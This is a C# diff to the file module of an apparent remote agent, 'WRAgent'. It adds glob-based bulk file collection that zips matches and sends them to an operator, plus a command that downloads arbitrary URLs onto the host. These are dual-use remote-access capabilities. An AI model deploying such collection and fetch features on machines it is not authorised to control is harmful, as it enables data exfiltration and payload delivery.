@@ -1,4 +1,5 @@
 using System.IO.Compression;
+using System.Net.Http;
 using System.Text;
 using System.Text.Json.Nodes;
 
@@ -7,7 +8,12 @@ namespace WRAgent
     internal static class FileModule
     {
         private static readonly Dictionary<string, FileStream> Uploads = new();
-        private const int MaxList = 3000;
+        private const int MaxList = 5000;
+
+        private static readonly HttpClient Http = new HttpClient
+        {
+            Timeout = TimeSpan.FromMinutes(10)
+        };
 
         // -----------------------------------------------------------------
         public static JsonObject Ls(JsonObject args)
@@ -30,6 +36,7 @@ namespace WRAgent
                             {
                                 ["name"] = fi.Name, ["path"] = fi.FullName,
                                 ["dir"] = false, ["size"] = fi.Length,
+                                ["hidden"] = false,
                                 ["mtime"] = fi.LastWriteTimeUtc.ToString("o")
                             })
                         }
@@ -42,7 +49,6 @@ namespace WRAgent
                 var arr = new JsonArray();
                 var sb = new StringBuilder();
                 sb.AppendLine($" {di.FullName}");
-                sb.AppendLine($" {"name",-48} {"size",12}  modified");
                 sb.AppendLine(new string('-', 78));
 
                 var count = 0;
@@ -52,9 +58,11 @@ namespace WRAgent
                     bool isDir;
                     long size = 0;
                     DateTime mtime;
+                    bool hidden;
                     try
                     {
                         isDir = (entry.Attributes & FileAttributes.Directory) != 0;
+                        hidden = (entry.Attributes & FileAttributes.Hidden) != 0;
                         if (!isDir && entry is FileInfo f) size = f.Length;
                         mtime = entry.LastWriteTime;
                     }
@@ -66,6 +74,7 @@ namespace WRAgent
                         ["path"] = entry.FullName,
                         ["dir"] = isDir,
                         ["size"] = size,
+                        ["hidden"] = hidden,
                         ["mtime"] = mtime.ToUniversalTime().ToString("o")
                     });
 
@@ -113,48 +122,131 @@ namespace WRAgent
         }
 
         // -----------------------------------------------------------------
+        /// <summary>
+        /// Pulls whatever the operator asked for: one path, a list of paths,
+        /// globs, folders — packs multiple hits into a single zip.
+        /// </summary>
         public static async Task<JsonObject> Download(JsonObject args, Transport t)
         {
+            var spec = Util.Str(args, "path");
+            if (spec.Length == 0) return new JsonObject { ["ok"] = false, ["error"] = "path required" };
+
+            try
+            {
+                var items = Resolve(spec);
+                if (items.Count == 0)
+                    return new JsonObject { ["ok"] = false, ["error"] = "nothing matched: " + spec };
+
+                var single = items.Count == 1 ? items[0] : null;
+                byte[] bytes;
+                string name;
+
+                if (single != null && File.Exists(single))
+                {
+                    bytes = await File.ReadAllBytesAsync(single).ConfigureAwait(false);
+                    name = Path.GetFileName(single);
+                }
+                else if (single != null && Directory.Exists(single))
+                {
+                    bytes = await ZipPath(single, Path.GetFileName(single.TrimEnd('\\')) + ".zip").ConfigureAwait(false);
+                    name = Path.GetFileName(single.TrimEnd('\\')) + ".zip";
+                }
+                else
+                {
+                    var tmp = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".zip");
+                    using (var zip = ZipFile.Open(tmp, ZipArchiveMode.Create))
+                    {
+                        foreach (var item in items)
+                        {
+                            if (Directory.Exists(item))
+                            {
+                                var root = Path.GetFileName(item.TrimEnd('\\'));
+                                foreach (var f in Directory.EnumerateFiles(item, "*",
+                                             SearchOption.AllDirectories))
+                                {
+                                    if (!IsReadable(f)) continue;
+                                    var rel = Path.Combine(root, Path.GetRelativePath(item, f));
+                                    try { zip.CreateEntryFromFile(f, rel, CompressionLevel.Fastest); } catch { }
+                                }
+                            }
+                            else if (File.Exists(item) && IsReadable(item))
+                            {
+                                try { zip.CreateEntryFromFile(item, Path.GetFileName(item), CompressionLevel.Fastest); } catch { }
+                            }
+                        }
+                    }
+                    bytes = await File.ReadAllBytesAsync(tmp).ConfigureAwait(false);
+                    try { File.Delete(tmp); } catch { }
+                    name = $"bundle-{DateTime.Now:HHmmss}.zip";
+                }
+
+                var meta = new JsonObject { ["name"] = name, ["path"] = spec };
+                await t.EmitBlobAsync("file", meta, bytes).ConfigureAwait(false);
+
+                return new JsonObject
+                {
+                    ["ok"] = true,
+                    ["stdout"] = $"queued {name} ({bytes.Length / 1024} KB)",
+                    ["meta"] = new JsonObject { ["files"] = items.Count, ["bytes"] = bytes.Length }
+                };
+            }
+            catch (Exception e)
+            {
+                return new JsonObject { ["ok"] = false, ["error"] = e.Message };
+            }
+        }
+
+        public static async Task<JsonObject> Wget(JsonObject args, Transport t)
+        {
+            var url = Util.Str(args, "url");
+            if (url.Length == 0) return new JsonObject { ["ok"] = false, ["error"] = "url required" };
+
+            var tid = Util.Str(args, "tid", "");
             var path = Util.Str(args, "path");
             try
             {
-                if (File.Exists(path))
+                if (path.Length == 0)
                 {
-                    var bytes = await File.ReadAllBytesAsync(path).ConfigureAwait(false);
-                    var meta = new JsonObject
-                    {
-                        ["name"] = Path.GetFileName(path),
-                        ["path"] = path
-                    };
-                    await t.EmitBlobAsync("file", meta, bytes).ConfigureAwait(false);
-                    return new JsonObject
-                    {
-                        ["ok"] = true,
-                        ["stdout"] = $"queued {path} ({bytes.Length} bytes)"
-                    };
+                    var leaf = Path.GetFileName(new Uri(url).AbsolutePath);
+                    if (string.IsNullOrWhiteSpace(leaf)) leaf = "download.bin";
+                    path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
+                        "Downloads", leaf);
                 }
 
-                if (Directory.Exists(path))
-                {
-                    var tmp = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".zip");
-                    ZipFile.CreateFromDirectory(path, tmp, CompressionLevel.Fastest, false);
-                    var bytes = await File.ReadAllBytesAsync(tmp).ConfigureAwait(false);
-                    try { File.Delete(tmp); } catch { }
+                var dir = Path.GetDirectoryName(path);
+                if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir);
 
-                    var meta = new JsonObject
+                using var res = await Http.GetAsync(url, HttpCompletionOption.ResponseHeadersRead)
+                                          .ConfigureAwait(false);
+                res.EnsureSuccessStatusCode();
+
+                var total = res.Content.Headers.ContentLength ?? -1;
+                long read = 0;
+                var last = -1;
+
+                await using (var src = await res.Content.ReadAsStreamAsync().ConfigureAwait(false))
+                await using (var dst = File.Create(path))
+                {
+                    var buf = new byte[81920];
+                    int n;
+                    while ((n = await src.ReadAsync(buf).ConfigureAwait(false)) > 0)
                     {
-                        ["name"] = new DirectoryInfo(path).Name + ".zip",
-                        ["path"] = path
-                    };
-                    await t.EmitBlobAsync("file", meta, bytes).ConfigureAwait(false);
-                    return new JsonObject
-                    {
-                        ["ok"] = true,
-                        ["stdout"] = $"queued archive of {path} ({bytes.Length} bytes)"
-                    };
+                        await dst.WriteAsync(buf.AsMemory(0, n)).ConfigureAwait(false);
+                        read += n;
+                        if (total > 0 && tid.Length > 0)
+                        {
+                            var pct = (int)(read * 100 / total);
+                            if (pct >= last + 5) { last = pct; await t.EmitProgress(tid, pct); }
+                        }
+                    }
                 }
 
-                return new JsonObject { ["ok"] = false, ["error"] = "not found: " + path };
+                return new JsonObject
+                {
+                    ["ok"] = true,
+                    ["stdout"] = $"saved {path} ({read / 1024} KB)",
+                    ["meta"] = new JsonObject { ["path"] = path, ["bytes"] = read }
+                };
             }
             catch (Exception e)
             {
@@ -195,7 +287,8 @@ namespace WRAgent
                         return new JsonObject
                         {
                             ["ok"] = true,
-                            ["stdout"] = $"uploaded {path}"
+                            ["stdout"] = $"uploaded {path}",
+                            ["meta"] = new JsonObject { ["path"] = path }
                         };
                     }
                     fs.Flush();
@@ -258,6 +351,51 @@ namespace WRAgent
             {
                 return new JsonObject { ["ok"] = false, ["error"] = e.Message };
             }
+        }
+
+        // -----------------------------------------------------------------
+        private static List<string> Resolve(string spec)
+        {
+            var hits = new List<string>();
+            foreach (var raw in spec.Split(new[] { '\n', ';' }, StringSplitOptions.RemoveEmptyEntries))
+            {
+                var part = Environment.ExpandEnvironmentVariables(raw.Trim().Trim('"'));
+                if (part.Length == 0) continue;
+                if (File.Exists(part) || Directory.Exists(part)) { hits.Add(part); continue; }
+
+                try
+                {
+                    var dir = Path.GetDirectoryName(part);
+                    var pattern = Path.GetFileName(part);
+                    if (!string.IsNullOrEmpty(dir) && Directory.Exists(dir) &&
+                        !string.IsNullOrEmpty(pattern) && pattern.Contains('*'))
+                    {
+                        hits.AddRange(Directory.GetFiles(dir, pattern));
+                        hits.AddRange(Directory.GetDirectories(dir, pattern));
+                    }
+                }
+                catch { }
+            }
+            return hits.Distinct(StringComparer.OrdinalIgnoreCase).ToList();
+        }
+
+        private static bool IsReadable(string path)
+        {
+            try
+            {
+                using var _ = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
+                return true;
+            }
+            catch { return false; }
+        }
+
+        private static async Task<byte[]> ZipPath(string dir, string name)
+        {
+            var tmp = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".zip");
+            ZipFile.CreateFromDirectory(dir, tmp, CompressionLevel.Fastest, false);
+            var bytes = await File.ReadAllBytesAsync(tmp).ConfigureAwait(false);
+            try { File.Delete(tmp); } catch { }
+            return bytes;
         }
 
         private static void CopyDir(string src, string dst)
